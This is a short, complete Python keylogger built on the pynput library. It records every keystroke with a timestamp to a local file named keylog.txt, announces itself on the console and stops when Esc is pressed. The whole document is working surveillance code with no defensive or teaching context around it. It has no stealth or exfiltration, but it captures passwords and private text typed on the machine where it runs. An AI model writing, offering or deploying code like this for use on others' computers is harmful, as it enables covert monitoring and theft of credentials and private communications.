from pynput.keyboard import Listener, Key
import datetime

# Define the file where the keystrokes will be saved
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Log the key pressed along with a timestamp
            f.write(f"{datetime.datetime.now()} - {key}\n")
        
        # Stop the listener if the Esc key is pressed
        if key == Key.esc:
            print("Esc key pressed. Stopping keylogger...")
            return False  # This stops the listener
    except Exception as e:
        print(f"Error writing to file: {e}")

# Set up the listener
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()